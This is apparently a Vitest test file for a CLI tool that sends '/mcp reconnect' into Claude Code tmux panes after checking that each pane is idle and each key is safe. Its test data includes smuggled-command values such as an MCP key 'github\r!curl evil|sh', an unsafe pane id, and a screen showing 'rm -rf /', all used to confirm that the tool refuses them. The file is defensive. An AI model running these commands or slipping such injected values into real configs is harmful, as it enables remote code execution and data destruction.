import { describe, it, expect, vi } from "vitest";
import { busyPane, composerState, reconnect, safeKey, RECONNECT_HELP } from "../src/cli/reconnect.ts";
import { brokerKeyOf, mcpEntry, SkippedFolder } from "../src/cli/mcp-config.ts";
import type { Pane } from "../src/cli/tmux.ts";
import { makeDeps, config, GROUPS } from "./helpers/cli-deps.mjs";

const DIR = "/run/gh-broker/agents";
const SOCK = "/tmp/tmux-1000/default";
const claude = (u: string) => `/home/${u}/.claude.json`;
const entry = JSON.stringify({ mcpServers: { github: mcpEntry("repo", DIR) } });

// Captured from live Claude Code panes (tmux capture-pane -p -J, this machine, 2026-11-21),
// excerpted to the relevant region; rule lines shortened to 40 columns, trailing column padding
// stripped. The current TUI keeps the empty input box ("❯") visible while it works, its working
// indicator is a spinner-glyph line ("✻ Waiting for 1 background agent to finish") with no
// ellipsis and no "esc to interrupt", and a finished turn shows "✻ … · done <time>".
const RULE = "────────────────────────────────────────";
const IDLE = `❯ /mcp reconnect all
  ⎿  Reconnected 1 of 1 MCP server

❯ /mcp reconnect all
  ⎿  Reconnected 1 of 1 MCP server

${RULE}
❯
${RULE}
  ⏵⏵ accept edits on (shift+tab to cycle)`;
const BUSY = `✻ Waiting for 1 background agent to finish

${RULE}
❯
${RULE}
  ⏵⏵ bypass permissions on (shift+tab to cycle) · ↓ to manage

  ● main
  ◯ general-purpose  Addressing round-1 review blockers in tmux.ts    54s · ↓ 240.5k tokens`;
const DONE = `✻ Baked for 29s · done 9:55 AM
                                  new task? /clear to save 865.3k tokens

${RULE}
❯
${RULE}
  ⏵⏵ bypass permissions on (shift+tab to cycle)`;
// A draft whose first line is blank (shift+enter first): the text sits under the "❯" line.
const BLANK_FIRST_DRAFT = `${RULE}
❯
  this is the second line of the draft
${RULE}
  ⏵⏵ accept edits on (shift+tab to cycle)`;
// A working-indicator line wrapped by a narrow pane (what capture without -J returns): the glyph
// line's first fragment carries no ellipsis at all.
const WRAPPED_BUSY = `✻ Fixing the flaky test in
src/agents.ts… (esc to
interrupt · 32s)`;
// A shell's PS2 continuation: the bottom-most ">" line is empty while the shell owns the tty.
const PS2_SHELL = `$ for f in *; do
>
`;

describe("busyPane (heuristic over Claude Code's screen)", () => {
	it("sees the working indicator of the current TUI and of older ones", () => {
		expect(busyPane(BUSY)).toBe(true);
		expect(busyPane(WRAPPED_BUSY)).toBe(true);
		expect(busyPane("✻ Thinking…")).toBe(true);
		expect(busyPane("· Scanning the repo… (esc to interrupt)")).toBe(true);
		expect(busyPane("  Working (ESC TO INTERRUPT · 4s)")).toBe(true);
	});

	it("leaves an idle, finished, dialog or typing pane alone", () => {
		expect(busyPane(IDLE)).toBe(false);
		expect(busyPane(DONE)).toBe(false);
		expect(busyPane(BLANK_FIRST_DRAFT)).toBe(false);
		expect(busyPane(PS2_SHELL)).toBe(false);
	});

	it("is not fooled by transcript lines and the task widget", () => {
		expect(busyPane("  ⎿  Running tests…")).toBe(false);
		expect(busyPane("● Bash(npm test…)")).toBe(false);
		expect(busyPane("  - fix the thing that hangs…")).toBe(false);
		expect(busyPane("  ● main")).toBe(false);
		expect(busyPane("  ◯ general-purpose  Doing a thing    54s · ↓ 240.5k tokens")).toBe(false);
	});
});

describe("composerState (heuristic over Claude Code's screen)", () => {
	it("reads the live input line", () => {
		expect(composerState(IDLE)).toBe("empty");
		expect(composerState(BUSY)).toBe("empty"); // the current TUI keeps the box visible while working; busyPane catches that pane
		expect(composerState(DONE)).toBe("empty");
		expect(composerState(`❯ /mcp reconnect all`)).toBe("typing");
		expect(composerState("> /mcp")).toBe("typing");
	});

	it("sees a draft whose first line is blank", () => {
		expect(composerState(BLANK_FIRST_DRAFT)).toBe("typing");
	});

	it("a permission dialog reads as typing (skipped — the safe direction), a prompt-less screen as none", () => {
		expect(composerState("Do you want to proceed?\n❯ 1. Yes\n  2. No (esc)")).toBe("typing");
		expect(composerState("!\n  ! for bash mode")).toBe("none");
		expect(composerState("")).toBe("none");
	});

	it("takes the bottom-most prompt line, so a user message in the transcript doesn't count", () => {
		expect(composerState(`${IDLE}\n❯ and one more thing`)).toBe("typing");
	});

	it("the PS2 continuation reads empty — the foreground check is what protects that pane", () => {
		expect(composerState(PS2_SHELL)).toBe("empty");
	});
});

describe("safeKey", () => {
	it("allows the names mcp-config writes, and nothing that could carry a newline or a command", () => {
		for (const k of ["github", "gh-broker", "gh-broker-repo", "A.b_c-9"]) expect(safeKey(k)).toBe(true);
		for (const k of ["github\r!curl evil|sh", "a\nb", "with space", "tab\there", "ünïcode", "", "x".repeat(65), "../etc"]) expect(safeKey(k)).toBe(false);
	});
});

describe("brokerKeyOf (what mcp-config wrote, read back)", () => {
	it("reads the broker entry's key out of a .claude.json text, or none", () => {
		expect(brokerKeyOf(JSON.stringify({ mcpServers: { github: mcpEntry("repo", DIR), x: { command: "npx" } } }), DIR)).toBe("github");
		expect(brokerKeyOf(JSON.stringify({ mcpServers: { x: { command: "npx" } } }), DIR)).toBeUndefined();
		expect(brokerKeyOf("{nope", DIR)).toBeUndefined();
		expect(brokerKeyOf("[]", DIR)).toBeUndefined();
		expect(brokerKeyOf(undefined, DIR)).toBeUndefined();
	});
});

describe("agent reconnect", () => {
	const info = { uid: 1000, gid: 1000, home: "/home/repo" };
	/** Deps whose tmux has `panes` on SOCK; tmuxPaneText re-captures `fresh` (an idle screen by default; `null` means the pane is gone). */
	function withPanes(panes: Pane[], over: Record<string, unknown> = {}, files: Record<string, string> = {}, fresh: string | null = "❯ \n") {
		return makeDeps(
			{ tmuxSockets: vi.fn(() => [SOCK]), tmuxPanes: vi.fn((_socket: string, _info: unknown) => panes), tmuxPaneText: vi.fn(() => (fresh === null ? undefined : fresh)), ...over },
			{ [claude("repo")]: entry, ...files }
		);
	}
	const pane = (id: string, text: string, over: Partial<Pane> = {}): Pane => ({ id, pid: 200, text, foreground: true, inMode: false, synchronized: false, ...over });

	it("sends /mcp reconnect with the agent's own key, as the agent, and lists it as sent", () => {
		const { d, out } = withPanes([pane("%3", IDLE), pane("%4", IDLE, { foreground: false })]);
		expect(reconnect(["repo"], config, d)).toBe(1);
		expect(d.tmuxSockets).toHaveBeenCalledWith(info);
		expect(d.tmuxPanes).toHaveBeenCalledWith(SOCK, info);
		expect(d.tmuxPaneText).toHaveBeenCalledWith(SOCK, "%3", info);
		expect(d.tmuxSend).toHaveBeenCalledTimes(1);
		expect(d.tmuxSend).toHaveBeenCalledWith(SOCK, "%3", "/mcp reconnect github", info);
		expect(out).toContain(`repo ${SOCK} %3 github sent`);
		expect(out).toContain(`repo ${SOCK} %4 github skipped (claude is not the pane's foreground job)`);
		expect(out[out.length - 1]).toBe("sent 1, skipped 1");
	});

	it("--dry-run lists what it would send where, sends nothing, and doesn't re-capture", () => {
		const { d, out } = withPanes([pane("%3", IDLE)]);
		expect(reconnect(["repo", "--dry-run"], config, d)).toBe(0);
		expect(d.tmuxSend).not.toHaveBeenCalled();
		expect(d.tmuxPaneText).not.toHaveBeenCalled();
		expect(out).toContain(`repo ${SOCK} %3 github would send`);
		expect(out[out.length - 1]).toBe('dry run: 1 pane(s) would get "/mcp reconnect"');
	});

	it("re-captures before sending: a pane gone, busy or typed into since the check is skipped", () => {
		const gone = withPanes([pane("%1", IDLE)], {}, {}, null);
		expect(reconnect(["repo"], config, gone.d)).toBe(1);
		expect(gone.out).toContain(`repo ${SOCK} %1 github skipped (gone since capture)`);
		expect(gone.d.tmuxSend).not.toHaveBeenCalled();
		const busy = withPanes([pane("%2", IDLE)], {}, {}, BUSY);
		expect(reconnect(["repo"], config, busy.d)).toBe(1);
		expect(busy.out).toContain(`repo ${SOCK} %2 github skipped (busy since capture)`);
		const typed = withPanes([pane("%3", IDLE)], {}, {}, "❯ rm -rf /\n");
		expect(reconnect(["repo"], config, typed.d)).toBe(1);
		expect(typed.out).toContain(`repo ${SOCK} %3 github skipped (changed since capture)`);
	});

	it("skips copy mode and synchronize-panes before anything else", () => {
		const { d, out } = withPanes([pane("%1", IDLE, { inMode: true }), pane("%2", IDLE, { synchronized: true })]);
		expect(reconnect(["repo"], config, d)).toBe(1);
		expect(out).toContain(`repo ${SOCK} %1 - skipped (pane is in copy mode)`);
		expect(out).toContain(`repo ${SOCK} %2 - skipped (synchronize-panes is on)`);
		expect(d.tmuxSend).not.toHaveBeenCalled();
	});

	it("skips a busy pane, one with text in the composer, and one without a prompt, with the pane id", () => {
		const { d, out } = withPanes([pane("%1", BUSY), pane("%2", "❯ fix the reconnect test"), pane("%3", "Do you want to proceed?\n1. Yes\n2. No (esc)")]);
		expect(reconnect(["repo"], config, d)).toBe(1);
		expect(d.tmuxSend).not.toHaveBeenCalled();
		expect(out).toContain(`repo ${SOCK} %1 github skipped (busy: Claude is working)`);
		expect(out).toContain(`repo ${SOCK} %2 github skipped (composer not empty)`);
		expect(out).toContain(`repo ${SOCK} %3 github skipped (no Claude Code prompt on screen)`);
	});

	it("skips a pane when the session's files have no broker entry, and never borrows another folder's key", () => {
		const SAVED = "/data/claude-saved";
		const saved = JSON.stringify({ mcpServers: { "gh-broker": mcpEntry("repo", DIR) } });
		const { d, out } = makeDeps(
			{
				tmuxSockets: vi.fn(() => [SOCK]),
				tmuxPanes: vi.fn(() => [pane("%1", IDLE, { configDir: "/home/repo/.claude-alt" })]),
				mcpIO: { read: (p: string) => (p === `${SAVED}/.claude.json` ? { text: saved, stat: { uid: 1000, gid: 1000, mode: 0o100600 } } : undefined), write: () => {} }
			},
			{ [claude("repo")]: JSON.stringify({ mcpServers: { x: { command: "npx" } } }), [`${SAVED}/.claude.json`]: saved }
		);
		// The session's own folder and the home file have no entry; the saved folder has one, but
		// its key may be wrong for this session — skipped, not borrowed.
		expect(reconnect(["repo"], { ...config, claudeConfigDirs: { repo: [SAVED] } }, d)).toBe(1);
		expect(out).toContain(`repo ${SOCK} %1 - skipped (no broker MCP entry in its .claude.json files)`);
	});

	it("sends the key from the session's own config folder, else the home file's", () => {
		const ALT = "/home/repo/.claude-alt";
		const files = { [claude("repo")]: entry, [`${ALT}/.claude.json`]: JSON.stringify({ mcpServers: { "gh-broker-repo": mcpEntry("repo", DIR) } }) };
		const { d, out } = makeDeps(
			{ tmuxSockets: vi.fn(() => [SOCK]), tmuxPanes: vi.fn(() => [pane("%1", IDLE, { configDir: ALT }), pane("%2", IDLE)]), mcpIO: { read: (p: string) => (files[p] === undefined ? undefined : { text: files[p], stat: { uid: 1000, gid: 1000, mode: 0o100600 } }), write: () => {}, scan: (home: string) => (home === "/home/repo" ? [ALT] : []) } },
			files
		);
		expect(reconnect(["repo"], config, d)).toBe(0);
		expect(out).toContain(`repo ${SOCK} %1 gh-broker-repo sent`);
		expect(out).toContain(`repo ${SOCK} %2 github sent`);
	});

	it("refuses to type a key that could carry a newline or a command, and logs no part of it", () => {
		const evil = JSON.stringify({ mcpServers: { "github\r!curl evil|sh": mcpEntry("repo", DIR) } });
		const { d, out } = withPanes([pane("%1", IDLE)], {}, { [claude("repo")]: evil });
		expect(reconnect(["repo"], config, d)).toBe(1);
		expect(out).toContain(`repo ${SOCK} %1 - skipped (unsafe MCP key)`);
		expect(out.join("\n")).not.toContain("evil");
		expect(d.tmuxSend).not.toHaveBeenCalled();
	});

	it("blank control characters out of a socket path in the log line, and refuse an unsafe pane id", () => {
		const { d, out } = withPanes([pane("%1", IDLE)], { tmuxSockets: vi.fn(() => ["/tmp/tmux-1000/evil\rsock"]) });
		expect(reconnect(["repo"], config, d)).toBe(0);
		expect(out).toContain("repo /tmp/tmux-1000/evil?sock %1 github sent");
		const badId = withPanes([pane("%1\r!x", IDLE)]);
		expect(reconnect(["repo"], config, badId.d)).toBe(1);
		expect(badId.out.join("\n")).toContain("skipped (unsafe pane id)");
	});

	it("carries on when a folder root won't be read", () => {
		const BROKEN = "/home/repo/.claude-broken";
		const { d, out } = makeDeps(
			{
				tmuxSockets: vi.fn(() => [SOCK]),
				tmuxPanes: vi.fn(() => [pane("%1", IDLE)]),
				mcpIO: {
					read: (p: string) => (p === claude("repo") ? { text: entry, stat: { uid: 1000, gid: 1000, mode: 0o100600 } } : undefined),
					write: () => {},
					scan: () => [BROKEN],
					pin: (folder: string) => {
						throw new SkippedFolder(`${folder} is owned by uid 0, not the agent user (uid 1000)`);
					}
				}
			},
			{ [claude("repo")]: entry }
		);
		expect(reconnect(["repo"], config, d)).toBe(0);
		expect(out).toContain(`repo ${SOCK} %1 github sent`);
	});

	it("lists panes from every tmux server the agent runs, with the socket in the line", () => {
		const OTHER = "/home/repo/.tmux/claude";
		const { d, out } = makeDeps(
			{ tmuxSockets: vi.fn(() => [SOCK, OTHER]), tmuxPanes: vi.fn((socket: string) => (socket === SOCK ? [pane("%1", IDLE)] : socket === OTHER ? [pane("%7", IDLE)] : [])) },
			{ [claude("repo")]: entry }
		);
		expect(reconnect(["repo"], config, d)).toBe(0);
		expect(out).toContain(`repo ${SOCK} %1 github sent`);
		expect(out).toContain(`repo ${OTHER} %7 github sent`);
	});

	it("covers every registered agent when none is named", () => {
		const { d, out } = makeDeps({ tmuxSockets: vi.fn(() => []) }, { [claude("repo")]: entry });
		expect(reconnect([], config, d)).toBe(0);
		expect(out).toContain("repo: no Claude Code sessions running (no tmux server)");
		expect(out).toContain("glmtest: no Claude Code sessions running (no tmux server)");
	});

	it("says when a tmux server runs but no pane is Claude Code", () => {
		const { d, out } = withPanes([]);
		expect(reconnect(["repo"], config, d)).toBe(0);
		expect(out).toContain("repo: no Claude Code sessions running");
		expect(out[out.length - 1]).toBe("sent 0, skipped 0");
	});

	it("keeps going when a send fails, and counts it as skipped", () => {
		const { d, out } = withPanes([pane("%1", IDLE), pane("%2", IDLE)], { tmuxSend: vi.fn((_s: string, p: string, _t: string, _i: unknown) => { if (p === "%1") throw new Error("pane died"); }) });
		expect(reconnect(["repo"], config, d)).toBe(1);
		expect(d.tmuxSend).toHaveBeenCalledTimes(2);
		expect(out).toContain(`repo ${SOCK} %1 github skipped (send failed: pane died)`);
		expect(out).toContain(`repo ${SOCK} %2 github sent`);
	});

	it("reports a registered agent with no user account and exits 1", () => {
		const groups = [...GROUPS, { name: "gh-broker-agent-ghost", gid: 992, members: ["gh-broker", "ghost"] }];
		const { d, err } = makeDeps({ groups: () => groups, tmuxSockets: vi.fn(() => []) });
		expect(reconnect([], config, d)).toBe(1);
		expect(err).toEqual(["ghost: no such user"]);
	});

	it("refuses an unregistered or invalid user, two users, and unknown flags", () => {
		const { d } = withPanes([]);
		expect(() => reconnect(["nobody"], config, d)).toThrow(/"nobody" is not a registered agent/);
		expect(() => reconnect(["Bad Name"], config, d)).toThrow(/not a valid agent user name/);
		expect(() => reconnect(["repo", "glmtest"], config, d)).toThrow(/name at most one agent user/);
		expect(() => reconnect(["repo", "--json"], config, d)).toThrow("unknown flag: --json");
		expect(d.tmuxSockets).not.toHaveBeenCalled();
	});

	it("prints its help and runs nothing", () => {
		const { d, out } = withPanes([]);
		expect(reconnect(["--help"], config, d)).toBe(0);
		expect(out).toEqual([RECONNECT_HELP]);
	});
});
